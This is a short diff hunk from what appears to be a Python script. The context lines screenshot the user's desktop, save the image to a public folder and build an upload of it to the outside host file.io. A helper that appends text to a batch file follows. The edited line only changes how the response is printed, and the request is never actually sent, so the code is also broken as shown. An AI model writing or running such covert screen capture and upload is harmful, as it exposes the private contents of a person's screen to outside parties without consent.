@@ -47,7 +47,7 @@ im1 = pag.screenshot()
 im2 = pag.screenshot(r'C:\Users\Public\Desktop\my_screenshot.png')
 files = {'file': open(r'C:\Users\Public\Desktop\my_screenshot.png', 'rb')}
 r = requests.Request('POST', 'https://file.io', files=files)
-print(r.text)
+print(r.json)
 
 def save_echo_to_batch(file_path, echo_text):
     with open(file_path, 'a') as file:
